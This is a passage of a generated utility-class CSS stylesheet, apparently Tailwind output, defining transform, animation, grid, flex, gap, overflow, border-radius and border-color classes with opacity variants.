  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.-rotate-90 {
  --tw-rotate: -90deg;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.rotate-180 {
  --tw-rotate: 180deg;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.rotate-90 {
  --tw-rotate: 90deg;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.scale-75 {
  --tw-scale-x: .75;
  --tw-scale-y: .75;
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
.transform {
  transform: translate(var(--tw-translate-x), var(--tw-translate-y)) rotate(var(--tw-rotate)) skewX(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y));
}
@keyframes bounce {

  0%, 100% {
    transform: translateY(-25%);
    animation-timing-function: cubic-bezier(0.8,0,1,1);
  }

  50% {
    transform: none;
    animation-timing-function: cubic-bezier(0,0,0.2,1);
  }
}
.animate-bounce {
  animation: bounce 1s infinite;
}
@keyframes pulse {

  50% {
    opacity: .5;
  }
}
.animate-pulse {
  animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
}
@keyframes spin {

  to {
    transform: rotate(360deg);
  }
}
.animate-spin {
  animation: spin 1s linear infinite;
}
.cursor-default {
  cursor: default;
}
.cursor-pointer {
  cursor: pointer;
}
.touch-none {
  touch-action: none;
}
.select-none {
  -webkit-user-select: none;
     -moz-user-select: none;
          user-select: none;
}
.resize {
  resize: both;
}
.snap-start {
  scroll-snap-align: start;
}
.appearance-none {
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none;
}
.grid-cols-1 {
  grid-template-columns: repeat(1, minmax(0, 1fr));
}
.grid-cols-10 {
  grid-template-columns: repeat(10, minmax(0, 1fr));
}
.grid-cols-11 {
  grid-template-columns: repeat(11, minmax(0, 1fr));
}
.grid-cols-12 {
  grid-template-columns: repeat(12, minmax(0, 1fr));
}
.grid-cols-2 {
  grid-template-columns: repeat(2, minmax(0, 1fr));
}
.grid-cols-3 {
  grid-template-columns: repeat(3, minmax(0, 1fr));
}
.grid-cols-4 {
  grid-template-columns: repeat(4, minmax(0, 1fr));
}
.grid-cols-5 {
  grid-template-columns: repeat(5, minmax(0, 1fr));
}
.grid-cols-6 {
  grid-template-columns: repeat(6, minmax(0, 1fr));
}
.grid-cols-7 {
  grid-template-columns: repeat(7, minmax(0, 1fr));
}
.grid-cols-8 {
  grid-template-columns: repeat(8, minmax(0, 1fr));
}
.grid-cols-9 {
  grid-template-columns: repeat(9, minmax(0, 1fr));
}
.grid-cols-none {
  grid-template-columns: none;
}
.grid-cols-subgrid {
  grid-template-columns: subgrid;
}
.grid-rows-1 {
  grid-template-rows: repeat(1, minmax(0, 1fr));
}
.grid-rows-10 {
  grid-template-rows: repeat(10, minmax(0, 1fr));
}
.grid-rows-11 {
  grid-template-rows: repeat(11, minmax(0, 1fr));
}
.grid-rows-12 {
  grid-template-rows: repeat(12, minmax(0, 1fr));
}
.grid-rows-2 {
  grid-template-rows: repeat(2, minmax(0, 1fr));
}
.grid-rows-3 {
  grid-template-rows: repeat(3, minmax(0, 1fr));
}
.grid-rows-4 {
  grid-template-rows: repeat(4, minmax(0, 1fr));
}
.grid-rows-5 {
  grid-template-rows: repeat(5, minmax(0, 1fr));
}
.grid-rows-6 {
  grid-template-rows: repeat(6, minmax(0, 1fr));
}
.grid-rows-7 {
  grid-template-rows: repeat(7, minmax(0, 1fr));
}
.grid-rows-8 {
  grid-template-rows: repeat(8, minmax(0, 1fr));
}
.grid-rows-9 {
  grid-template-rows: repeat(9, minmax(0, 1fr));
}
.grid-rows-none {
  grid-template-rows: none;
}
.grid-rows-subgrid {
  grid-template-rows: subgrid;
}
.flex-row {
  flex-direction: row;
}
.flex-col {
  flex-direction: column;
}
.flex-wrap {
  flex-wrap: wrap;
}
.items-start {
  align-items: flex-start;
}
.items-end {
  align-items: flex-end;
}
.items-center {
  align-items: center;
}
.items-stretch {
  align-items: stretch;
}
.justify-start {
  justify-content: flex-start;
}
.justify-end {
  justify-content: flex-end;
}
.justify-center {
  justify-content: center;
}
.justify-between {
  justify-content: space-between;
}
.justify-around {
  justify-content: space-around;
}
.gap-0 {
  gap: 0px;
}
.gap-1 {
  gap: 1px;
}
.gap-\[10px\] {
  gap: 10px;
}
.gap-\[3px\] {
  gap: 3px;
}
.gap-md {
  gap: 24px;
}
.gap-sm {
  gap: 12px;
}
.gap-xs {
  gap: 6px;
}
.gap-x-0 {
  -moz-column-gap: 0px;
       column-gap: 0px;
}
.gap-x-1 {
  -moz-column-gap: 1px;
       column-gap: 1px;
}
.gap-x-md {
  -moz-column-gap: 24px;
       column-gap: 24px;
}
.gap-x-sm {
  -moz-column-gap: 12px;
       column-gap: 12px;
}
.gap-x-xs {
  -moz-column-gap: 6px;
       column-gap: 6px;
}
.gap-y-0 {
  row-gap: 0px;
}
.gap-y-1 {
  row-gap: 1px;
}
.gap-y-md {
  row-gap: 24px;
}
.gap-y-sm {
  row-gap: 12px;
}
.gap-y-xs {
  row-gap: 6px;
}
.self-stretch {
  align-self: stretch;
}
.overflow-hidden {
  overflow: hidden;
}
.overflow-scroll {
  overflow: scroll;
}
.overflow-x-hidden {
  overflow-x: hidden;
}
.overflow-y-hidden {
  overflow-y: hidden;
}
.overflow-x-scroll {
  overflow-x: scroll;
}
.overflow-y-scroll {
  overflow-y: scroll;
}
.overscroll-contain {
  overscroll-behavior: contain;
}
.truncate {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}
.text-ellipsis {
  text-overflow: ellipsis;
}
.whitespace-nowrap {
  white-space: nowrap;
}
.text-wrap {
  text-wrap: wrap;
}
.text-nowrap {
  text-wrap: nowrap;
}
.break-all {
  word-break: break-all;
}
.rounded-1 {
  border-radius: 1px;
}
.rounded-\[100\%\] {
  border-radius: 100%;
}
.rounded-\[10px\] {
  border-radius: 10px;
}
.rounded-\[12px\] {
  border-radius: 12px;
}
.rounded-\[16px\] {
  border-radius: 16px;
}
.rounded-\[22\.5px\] {
  border-radius: 22.5px;
}
.rounded-\[2px\] {
  border-radius: 2px;
}
.rounded-\[60px\] {
  border-radius: 60px;
}
.rounded-\[8px\] {
  border-radius: 8px;
}
.rounded-edges {
  border-radius: 4px;
}
.rounded-full {
  border-radius: 100%;
}
.rounded-t-edges {
  border-top-left-radius: 4px;
  border-top-right-radius: 4px;
}
.border-0 {
  border-width: 0px;
}
.border-0\.5 {
  border-width: 0.5px;
}
.border-1 {
  border-width: 1px;
}
.border-2 {
  border-width: 2px;
}
.border-3 {
  border-width: 3px;
}
.border-\[1\.5px\] {
  border-width: 1.5px;
}
.border-\[4px\] {
  border-width: 4px;
}
.border-b-1 {
  border-bottom-width: 1px;
}
.border-b-2 {
  border-bottom-width: 2px;
}
.border-l-0 {
  border-left-width: 0px;
}
.border-l-0\.5 {
  border-left-width: 0.5px;
}
.border-l-1 {
  border-left-width: 1px;
}
.border-l-2 {
  border-left-width: 2px;
}
.border-l-3 {
  border-left-width: 3px;
}
.border-t-1 {
  border-top-width: 1px;
}
.border-solid {
  border-style: solid;
}
.border-\[\#F94144\] {
  --tw-border-opacity: 1;
  border-color: rgb(249 65 68 / var(--tw-border-opacity));
}
.border-gray-100 {
  --tw-border-opacity: 1;
  border-color: rgb(175 175 177 / var(--tw-border-opacity));
}
.border-gray-100\/50 {
  border-color: rgb(175 175 177 / 0.5);
}
.border-gray-300 {
  --tw-border-opacity: 1;
  border-color: rgb(226 232 236 / var(--tw-border-opacity));
}
.border-gray-50 {
  --tw-border-opacity: 1;
  border-color: rgb(245 245 245 / var(--tw-border-opacity));
}
.border-green-100 {
  --tw-border-opacity: 1;
  border-color: rgb(158 190 89 / var(--tw-border-opacity));
}
.border-pink-100 {
  --tw-border-opacity: 1;
  border-color: rgb(225 87 113 / var(--tw-border-opacity));
}
.border-pink-150 {
  --tw-border-opacity: 1;
  border-color: rgb(194 129 149 / var(--tw-border-opacity));
}
.border-pink-200 {
  --tw-border-opacity: 1;
  border-color: rgb(188 64 102 / var(--tw-border-opacity));
}
.border-pink-50 {
  --tw-border-opacity: 1;
  border-color: rgb(246 214 221 / var(--tw-border-opacity));
}
.border-white {
  --tw-border-opacity: 1;
  border-color: rgb(255 255 255 / var(--tw-border-opacity));
}
.border-b-gray-100 {
  --tw-border-opacity: 1;
  border-bottom-color: rgb(175 175 177 / var(--tw-border-opacity));
}
.border-b-gray-300 {
  --tw-border-opacity: 1;
  border-bottom-color: rgb(226 232 236 / var(--tw-border-opacity));
}
.border-b-gray-50 {
  --tw-border-opacity: 1;
  border-bottom-color: rgb(245 245 245 / var(--tw-border-opacity));
}
.border-b-pink-150 {
  --tw-border-opacity: 1;
  border-bottom-color: rgb(194 129 149 / var(--tw-border-opacity));
}
.border-b-pink-50 {
  --tw-border-opacity: 1;
  border-bottom-color: rgb(246 214 221 / var(--tw-border-opacity));
}
.border-l-black {
  --tw-border-opacity: 1;
  border-left-color: rgb(29 32 34 / var(--tw-border-opacity));
}
.border-l-black\/0 {
  border-left-color: rgb(29 32 34 / 0);
}
.border-l-black\/10 {
  border-left-color: rgb(29 32 34 / 0.1);
}
.border-l-black\/100 {
  border-left-color: rgb(29 32 34 / 1);
}
.border-l-black\/15 {
  border-left-color: rgb(29 32 34 / 0.15);
}
.border-l-black\/20 {
  border-left-color: rgb(29 32 34 / 0.2);
}
.border-l-black\/25 {
  border-left-color: rgb(29 32 34 / 0.25);
}
.border-l-black\/30 {
  border-left-color: rgb(29 32 34 / 0.3);
}
.border-l-black\/35 {
  border-left-color: rgb(29 32 34 / 0.35);
}
.border-l-black\/40 {
  border-left-color: rgb(29 32 34 / 0.4);
}
.border-l-black\/45 {
  border-left-color: rgb(29 32 34 / 0.45);
}
.border-l-black\/5 {
  border-left-color: rgb(29 32 34 / 0.05);
}
.border-l-black\/50 {
  border-left-color: rgb(29 32 34 / 0.5);
}
.border-l-black\/55 {
  border-left-color: rgb(29 32 34 / 0.55);
}
.border-l-black\/60 {
  border-left-color: rgb(29 32 34 / 0.6);
}
.border-l-black\/65 {
  border-left-color: rgb(29 32 34 / 0.65);
}
.border-l-black\/70 {
  border-left-color: rgb(29 32 34 / 0.7);
}
.border-l-black\/75 {
  border-left-color: rgb(29 32 34 / 0.75);
}
.border-l-black\/80 {
  border-left-color: rgb(29 32 34 / 0.8);
}
.border-l-black\/85 {
  border-left-color: rgb(29 32 34 / 0.85);
}
.border-l-black\/90 {
  border-left-color: rgb(29 32 34 / 0.9);
}
.border-l-black\/95 {
  border-left-color: rgb(29 32 34 / 0.95);
}
.border-l-blue {
  --tw-border-opacity: 1;
  border-left-color: rgb(55 135 255 / var(--tw-border-opacity));
}
.border-l-blue-clicked {
  --tw-border-opacity: 1;
  border-left-color: rgb(12 99 231 / var(--tw-border-opacity));
}
.border-l-blue-clicked\/0 {
  border-left-color: rgb(12 99 231 / 0);
}
.border-l-blue-clicked\/10 {
  border-left-color: rgb(12 99 231 / 0.1);
}
.border-l-blue-clicked\/100 {
  border-left-color: rgb(12 99 231 / 1);
}
.border-l-blue-clicked\/15 {
  border-left-color: rgb(12 99 231 / 0.15);
}
.border-l-blue-clicked\/20 {
  border-left-color: rgb(12 99 231 / 0.2);
}
.border-l-blue-clicked\/25 {
  border-left-color: rgb(12 99 231 / 0.25);
}
.border-l-blue-clicked\/30 {
  border-left-color: rgb(12 99 231 / 0.3);
}
.border-l-blue-clicked\/35 {
  border-left-color: rgb(12 99 231 / 0.35);
}
.border-l-blue-clicked\/40 {
  border-left-color: rgb(12 99 231 / 0.4);
}
.border-l-blue-clicked\/45 {
  border-left-color: rgb(12 99 231 / 0.45);
}
.border-l-blue-clicked\/5 {
  border-left-color: rgb(12 99 231 / 0.05);
}
.border-l-blue-clicked\/50 {
  border-left-color: rgb(12 99 231 / 0.5);
}
.border-l-blue-clicked\/55 {
  border-left-color: rgb(12 99 231 / 0.55);
}
.border-l-blue-clicked\/60 {
  border-left-color: rgb(12 99 231 / 0.6);
}
.border-l-blue-clicked\/65 {
  border-left-color: rgb(12 99 231 / 0.65);
}
.border-l-blue-clicked\/70 {
  border-left-color: rgb(12 99 231 / 0.7);
}
.border-l-blue-clicked\/75 {
  border-left-color: rgb(12 99 231 / 0.75);
}
.border-l-blue-clicked\/80 {
  border-left-color: rgb(12 99 231 / 0.8);
}
.border-l-blue-clicked\/85 {
  border-left-color: rgb(12 99 231 / 0.85);
}
.border-l-blue-clicked\/90 {
  border-left-color: rgb(12 99 231 / 0.9);
}
.border-l-blue-clicked\/95 {
  border-left-color: rgb(12 99 231 / 0.95);
}
.border-l-blue-light {
  --tw-border-opacity: 1;
  border-left-color: rgb(0 209 255 / var(--tw-border-opacity));
}
.border-l-blue-light\/0 {
  border-left-color: rgb(0 209 255 / 0);
}
.border-l-blue-light\/10 {
  border-left-color: rgb(0 209 255 / 0.1);
}
.border-l-blue-light\/100 {
  border-left-color: rgb(0 209 255 / 1);
}
.border-l-blue-light\/15 {
  border-left-color: rgb(0 209 255 / 0.15);
}
.border-l-blue-light\/20 {
  border-left-color: rgb(0 209 255 / 0.2);
}
.border-l-blue-light\/25 {
  border-left-color: rgb(0 209 255 / 0.25);
}
.border-l-blue-light\/30 {
  border-left-color: rgb(0 209 255 / 0.3);
}
.border-l-blue-light\/35 {
  border-left-color: rgb(0 209 255 / 0.35);
}
.border-l-blue-light\/40 {
  border-left-color: rgb(0 209 255 / 0.4);
}
.border-l-blue-light\/45 {
  border-left-color: rgb(0 209 255 / 0.45);
}
.border-l-blue-light\/5 {
  border-left-color: rgb(0 209 255 / 0.05);
}
.border-l-blue-light\/50 {
  border-left-color: rgb(0 209 255 / 0.5);
}
.border-l-blue-light\/55 {
  border-left-color: rgb(0 209 255 / 0.55);
}
.border-l-blue-light\/60 {
  border-left-color: rgb(0 209 255 / 0.6);
}
.border-l-blue-light\/65 {
  border-left-color: rgb(0 209 255 / 0.65);
}
.border-l-blue-light\/70 {
  border-left-color: rgb(0 209 255 / 0.7);
}
.border-l-blue-light\/75 {
  border-left-color: rgb(0 209 255 / 0.75);
}
.border-l-blue-light\/80 {
  border-left-color: rgb(0 209 255 / 0.8);
}
.border-l-blue-light\/85 {
  border-left-color: rgb(0 209 255 / 0.85);
}
.border-l-blue-light\/90 {
  border-left-color: rgb(0 209 255 / 0.9);
}
.border-l-blue-light\/95 {
  border-left-color: rgb(0 209 255 / 0.95);
}
.border-l-blue\/0 {
  border-left-color: rgb(55 135 255 / 0);
}
.border-l-blue\/10 {
  border-left-color: rgb(55 135 255 / 0.1);
}
.border-l-blue\/100 {
  border-left-color: rgb(55 135 255 / 1);
}
.border-l-blue\/15 {
  border-left-color: rgb(55 135 255 / 0.15);
}
.border-l-blue\/20 {
  border-left-color: rgb(55 135 255 / 0.2);
}
.border-l-blue\/25 {
  border-left-color: rgb(55 135 255 / 0.25);
}
.border-l-blue\/30 {
  border-left-color: rgb(55 135 255 / 0.3);
}
.border-l-blue\/35 {
  border-left-color: rgb(55 135 255 / 0.35);
}
.border-l-blue\/40 {
  border-left-color: rgb(55 135 255 / 0.4);
}
.border-l-blue\/45 {
  border-left-color: rgb(55 135 255 / 0.45);
}
.border-l-blue\/5 {
  border-left-color: rgb(55 135 255 / 0.05);
}
.border-l-blue\/50 {
  border-left-color: rgb(55 135 255 / 0.5);
}
.border-l-blue\/55 {
  border-left-color: rgb(55 135 255 / 0.55);
}
.border-l-blue\/60 {
  border-left-color: rgb(55 135 255 / 0.6);
}
.border-l-blue\/65 {
  border-left-color: rgb(55 135 255 / 0.65);
}
.border-l-blue\/70 {
  border-left-color: rgb(55 135 255 / 0.7);
}
.border-l-blue\/75 {
  border-left-color: rgb(55 135 255 / 0.75);
}
.border-l-blue\/80 {
  border-left-color: rgb(55 135 255 / 0.8);
}
.border-l-blue\/85 {
  border-left-color: rgb(55 135 255 / 0.85);
}
.border-l-blue\/90 {
  border-left-color: rgb(55 135 255 / 0.9);
}
.border-l-blue\/95 {
  border-left-color: rgb(55 135 255 / 0.95);
}
.border-l-design_notes {
  --tw-border-opacity: 1;
  border-left-color: rgb(151 71 255 / var(--tw-border-opacity));
}
.border-l-design_notes\/0 {
  border-left-color: rgb(151 71 255 / 0);
}
.border-l-design_notes\/10 {
  border-left-color: rgb(151 71 255 / 0.1);
}
.border-l-design_notes\/100 {
  border-left-color: rgb(151 71 255 / 1);
}
.border-l-design_notes\/15 {
  border-left-color: rgb(151 71 255 / 0.15);
}
.border-l-design_notes\/20 {
  border-left-color: rgb(151 71 255 / 0.2);
}
.border-l-design_notes\/25 {
  border-left-color: rgb(151 71 255 / 0.25);
}
.border-l-design_notes\/30 {
  border-left-color: rgb(151 71 255 / 0.3);
}
.border-l-design_notes\/35 {
  border-left-color: rgb(151 71 255 / 0.35);
}
.border-l-design_notes\/40 {
  border-left-color: rgb(151 71 255 / 0.4);
}
.border-l-design_notes\/45 {
  border-left-color: rgb(151 71 255 / 0.45);
}
.border-l-design_notes\/5 {
  border-left-color: rgb(151 71 255 / 0.05);
}
.border-l-design_notes\/50 {
  border-left-color: rgb(151 71 255 / 0.5);
}
.border-l-design_notes\/55 {
  border-left-color: rgb(151 71 255 / 0.55);
}
.border-l-design_notes\/60 {
  border-left-color: rgb(151 71 255 / 0.6);
}
.border-l-design_notes\/65 {
  border-left-color: rgb(151 71 255 / 0.65);
}
.border-l-design_notes\/70 {
  border-left-color: rgb(151 71 255 / 0.7);
}
.border-l-design_notes\/75 {
  border-left-color: rgb(151 71 255 / 0.75);
}
.border-l-design_notes\/80 {
  border-left-color: rgb(151 71 255 / 0.8);
}
.border-l-design_notes\/85 {
  border-left-color: rgb(151 71 255 / 0.85);
}
.border-l-design_notes\/90 {
  border-left-color: rgb(151 71 255 / 0.9);
}
.border-l-design_notes\/95 {
  border-left-color: rgb(151 71 255 / 0.95);
}
.border-l-ds {
  border-left-color: rgba(23, 168, 81, 0.1);
}
.border-l-ds\/0 {
  border-left-color: rgba(23, 168, 81, 0);
}
.border-l-ds\/10 {
  border-left-color: rgba(23, 168, 81, 0.1);
}
.border-l-ds\/100 {
  border-left-color: rgba(23, 168, 81, 1);
}
.border-l-ds\/15 {
  border-left-color: rgba(23, 168, 81, 0.15);
}
.border-l-ds\/20 {
  border-left-color: rgba(23, 168, 81, 0.2);
}
.border-l-ds\/25 {
  border-left-color: rgba(23, 168, 81, 0.25);
}
.border-l-ds\/30 {
  border-left-color: rgba(23, 168, 81, 0.3);
}
.border-l-ds\/35 {
  border-left-color: rgba(23, 168, 81, 0.35);
}
.border-l-ds\/40 {
  border-left-color: rgba(23, 168, 81, 0.4);
}
.border-l-ds\/45 {
  border-left-color: rgba(23, 168, 81, 0.45);
}
.border-l-ds\/5 {
  border-left-color: rgba(23, 168, 81, 0.05);
}
.border-l-ds\/50 {
  border-left-color: rgba(23, 168, 81, 0.5);
}
.border-l-ds\/55 {
  border-left-color: rgba(23, 168, 81, 0.55);
}
.border-l-ds\/60 {
  border-left-color: rgba(23, 168, 81, 0.6);
}
.border-l-ds\/65 {
  border-left-color: rgba(23, 168, 81, 0.65);
}
.border-l-ds\/70 {
  border-left-color: rgba(23, 168, 81, 0.7);
}
.border-l-ds\/75 {
  border-left-color: rgba(23, 168, 81, 0.75);
}
.border-l-ds\/80 {
  border-left-color: rgba(23, 168, 81, 0.8);
}
.border-l-ds\/85 {
  border-left-color: rgba(23, 168, 81, 0.85);
}
.border-l-ds\/90 {
  border-left-color: rgba(23, 168, 81, 0.9);
}
.border-l-ds\/95 {
  border-left-color: rgba(23, 168, 81, 0.95);
}
.border-l-gray-100 {
  --tw-border-opacity: 1;
  border-left-color: rgb(175 175 177 / var(--tw-border-opacity));
}
.border-l-gray-100\/0 {
  border-left-color: rgb(175 175 177 / 0);
}
.border-l-gray-100\/10 {
  border-left-color: rgb(175 175 177 / 0.1);
}
.border-l-gray-100\/100 {
  border-left-color: rgb(175 175 177 / 1);
}
.border-l-gray-100\/15 {
  border-left-color: rgb(175 175 177 / 0.15);
}
.border-l-gray-100\/20 {
  border-left-color: rgb(175 175 177 / 0.2);
}
.border-l-gray-100\/25 {
  border-left-color: rgb(175 175 177 / 0.25);
}
.border-l-gray-100\/30 {
  border-left-color: rgb(175 175 177 / 0.3);
}
.border-l-gray-100\/35 {
  border-left-color: rgb(175 175 177 / 0.35);
}
.border-l-gray-100\/40 {
  border-left-color: rgb(175 175 177 / 0.4);
}
.border-l-gray-100\/45 {
  border-left-color: rgb(175 175 177 / 0.45);
}
.border-l-gray-100\/5 {
  border-left-color: rgb(175 175 177 / 0.05);
}
.border-l-gray-100\/50 {
  border-left-color: rgb(175 175 177 / 0.5);
}
.border-l-gray-100\/55 {
  border-left-color: rgb(175 175 177 / 0.55);
}
.border-l-gray-100\/60 {
  border-left-color: rgb(175 175 177 / 0.6);
}
.border-l-gray-100\/65 {
  border-left-color: rgb(175 175 177 / 0.65);
}
.border-l-gray-100\/70 {
  border-left-color: rgb(175 175 177 / 0.7);
}
.border-l-gray-100\/75 {
  border-left-color: rgb(175 175 177 / 0.75);
}
.border-l-gray-100\/80 {
  border-left-color: rgb(175 175 177 / 0.8);
}
.border-l-gray-100\/85 {
  border-left-color: rgb(175 175 177 / 0.85);
}
.border-l-gray-100\/90 {
  border-left-color: rgb(175 175 177 / 0.9);
}
.border-l-gray-100\/95 {
  border-left-color: rgb(175 175 177 / 0.95);
}
.border-l-gray-200 {
  --tw-border-opacity: 1;
  border-left-color: rgb(206 214 222 / var(--tw-border-opacity));
}
.border-l-gray-200\/0 {
  border-left-color: rgb(206 214 222 / 0);
}
.border-l-gray-200\/10 {
  border-left-color: rgb(206 214 222 / 0.1);
}
.border-l-gray-200\/100 {
  border-left-color: rgb(206 214 222 / 1);
}
.border-l-gray-200\/15 {
  border-left-color: rgb(206 214 222 / 0.15);
}
.border-l-gray-200\/20 {
  border-left-color: rgb(206 214 222 / 0.2);
}
.border-l-gray-200\/25 {
  border-left-color: rgb(206 214 222 / 0.25);
}
.border-l-gray-200\/30 {
  border-left-color: rgb(206 214 222 / 0.3);
}
.border-l-gray-200\/35 {
  border-left-color: rgb(206 214 222 / 0.35);
}
.border-l-gray-200\/40 {
  border-left-color: rgb(206 214 222 / 0.4);
}
.border-l-gray-200\/45 {
  border-left-color: rgb(206 214 222 / 0.45);
}
.border-l-gray-200\/5 {
  border-left-color: rgb(206 214 222 / 0.05);
}
.border-l-gray-200\/50 {
  border-left-color: rgb(206 214 222 / 0.5);
}
.border-l-gray-200\/55 {
  border-left-color: rgb(206 214 222 / 0.55);
}
.border-l-gray-200\/60 {
  border-left-color: rgb(206 214 222 / 0.6);
}
.border-l-gray-200\/65 {
  border-left-color: rgb(206 214 222 / 0.65);
}
.border-l-gray-200\/70 {
  border-left-color: rgb(206 214 222 / 0.7);
}
.border-l-gray-200\/75 {
  border-left-color: rgb(206 214 222 / 0.75);
}
.border-l-gray-200\/80 {
  border-left-color: rgb(206 214 222 / 0.8);
}
.border-l-gray-200\/85 {
  border-left-color: rgb(206 214 222 / 0.85);
}
.border-l-gray-200\/90 {
  border-left-color: rgb(206 214 222 / 0.9);
}
.border-l-gray-200\/95 {
  border-left-color: rgb(206 214 222 / 0.95);
}
.border-l-gray-300 {
  --tw-border-opacity: 1;
  border-left-color: rgb(226 232 236 / var(--tw-border-opacity));
}
.border-l-gray-300\/0 {
  border-left-color: rgb(226 232 236 / 0);
}
.border-l-gray-300\/10 {
  border-left-color: rgb(226 232 236 / 0.1);
}
.border-l-gray-300\/100 {
  border-left-color: rgb(226 232 236 / 1);
}
.border-l-gray-300\/15 {
  border-left-color: rgb(226 232 236 / 0.15);
}
.border-l-gray-300\/20 {
  border-left-color: rgb(226 232 236 / 0.2);
}
.border-l-gray-300\/25 {
  border-left-color: rgb(226 232 236 / 0.25);
}
.border-l-gray-300\/30 {
  border-left-color: rgb(226 232 236 / 0.3);
}
.border-l-gray-300\/35 {
  border-left-color: rgb(226 232 236 / 0.35);
}
.border-l-gray-300\/40 {
  border-left-color: rgb(226 232 236 / 0.4);
}
.border-l-gray-300\/45 {
  border-left-color: rgb(226 232 236 / 0.45);
}
.border-l-gray-300\/5 {
  border-left-color: rgb(226 232 236 / 0.05);
}
.border-l-gray-300\/50 {
  border-left-color: rgb(226 232 236 / 0.5);
}
.border-l-gray-300\/55 {
  border-left-color: rgb(226 232 236 / 0.55);
}
.border-l-gray-300\/60 {
  border-left-color: rgb(226 232 236 / 0.6);
}
.border-l-gray-300\/65 {
  border-left-color: rgb(226 232 236 / 0.65);
}
.border-l-gray-300\/70 {
  border-left-color: rgb(226 232 236 / 0.7);
}
.border-l-gray-300\/75 {
  border-left-color: rgb(226 232 236 / 0.75);
}
.border-l-gray-300\/80 {
  border-left-color: rgb(226 232 236 / 0.8);
}
.border-l-gray-300\/85 {
  border-left-color: rgb(226 232 236 / 0.85);
}
.border-l-gray-300\/90 {
  border-left-color: rgb(226 232 236 / 0.9);
}
.border-l-gray-300\/95 {
  border-left-color: rgb(226 232 236 / 0.95);
}
.border-l-gray-400 {
  --tw-border-opacity: 1;
  border-left-color: rgb(195 198 203 / var(--tw-border-opacity));
}
.border-l-gray-400\/0 {
  border-left-color: rgb(195 198 203 / 0);
}
.border-l-gray-400\/10 {
  border-left-color: rgb(195 198 203 / 0.1);
}
.border-l-gray-400\/100 {
  border-left-color: rgb(195 198 203 / 1);
}
.border-l-gray-400\/15 {
  border-left-color: rgb(195 198 203 / 0.15);
}
.border-l-gray-400\/20 {
  border-left-color: rgb(195 198 203 / 0.2);
}
.border-l-gray-400\/25 {
  border-left-color: rgb(195 198 203 / 0.25);
}
.border-l-gray-400\/30 {
  border-left-color: rgb(195 198 203 / 0.3);
}
.border-l-gray-400\/35 {
  border-left-color: rgb(195 198 203 / 0.35);
}
.border-l-gray-400\/40 {
  border-left-color: rgb(195 198 203 / 0.4);
}
.border-l-gray-400\/45 {
  border-left-color: rgb(195 198 203 / 0.45);
}
.border-l-gray-400\/5 {
  border-left-color: rgb(195 198 203 / 0.05);
}
.border-l-gray-400\/50 {
  border-left-color: rgb(195 198 203 / 0.5);
}
.border-l-gray-400\/55 {
  border-left-color: rgb(195 198 203 / 0.55);
}
.border-l-gray-400\/60 {
  border-left-color: rgb(195 198 203 / 0.6);
}
.border-l-gray-400\/65 {
  border-left-color: rgb(195 198 203 / 0.65);
}
.border-l-gray-400\/70 {
  border-left-color: rgb(195 198 203 / 0.7);
}
.border-l-gray-400\/75 {
  border-left-color: rgb(195 198 203 / 0.75);
}
.border-l-gray-400\/80 {
  border-left-color: rgb(195 198 203 / 0.8);
}
.border-l-gray-400\/85 {
  border-left-color: rgb(195 198 203 / 0.85);
}
.border-l-gray-400\/90 {
  border-left-color: rgb(195 198 203 / 0.9);
}
.border-l-gray-400\/95 {
  border-left-color: rgb(195 198 203 / 0.95);
}
.border-l-gray-50 {
  --tw-border-opacity: 1;
  border-left-color: rgb(245 245 245 / var(--tw-border-opacity));
}
.border-l-gray-50\/0 {
  border-left-color: rgb(245 245 245 / 0);
}
.border-l-gray-50\/10 {
  border-left-color: rgb(245 245 245 / 0.1);
}
.border-l-gray-50\/100 {
  border-left-color: rgb(245 245 245 / 1);
}
.border-l-gray-50\/15 {
  border-left-color: rgb(245 245 245 / 0.15);
}
.border-l-gray-50\/20 {
  border-left-color: rgb(245 245 245 / 0.2);
}
.border-l-gray-50\/25 {
  border-left-color: rgb(245 245 245 / 0.25);
}
.border-l-gray-50\/30 {
  border-left-color: rgb(245 245 245 / 0.3);
}
.border-l-gray-50\/35 {
  border-left-color: rgb(245 245 245 / 0.35);
}
.border-l-gray-50\/40 {
  border-left-color: rgb(245 245 245 / 0.4);
}
.border-l-gray-50\/45 {
  border-left-color: rgb(245 245 245 / 0.45);
}
.border-l-gray-50\/5 {
  border-left-color: rgb(245 245 245 / 0.05);
}
.border-l-gray-50\/50 {
  border-left-color: rgb(245 245 245 / 0.5);
}
.border-l-gray-50\/55 {
  border-left-color: rgb(245 245 245 / 0.55);
}
.border-l-gray-50\/60 {
  border-left-color: rgb(245 245 245 / 0.6);
}
.border-l-gray-50\/65 {
  border-left-color: rgb(245 245 245 / 0.65);
}
.border-l-gray-50\/70 {
  border-left-color: rgb(245 245 245 / 0.7);
}
.border-l-gray-50\/75 {
  border-left-color: rgb(245 245 245 / 0.75);
}
.border-l-gray-50\/80 {
  border-left-color: rgb(245 245 245 / 0.8);
}
.border-l-gray-50\/85 {
  border-left-color: rgb(245 245 245 / 0.85);
}
.border-l-gray-50\/90 {
  border-left-color: rgb(245 245 245 / 0.9);
}
.border-l-gray-50\/95 {
  border-left-color: rgb(245 245 245 / 0.95);
}
.border-l-gray-500 {
  --tw-border-opacity: 1;
  border-left-color: rgb(137 137 138 / var(--tw-border-opacity));
}
.border-l-gray-500\/0 {
  border-left-color: rgb(137 137 138 / 0);
}
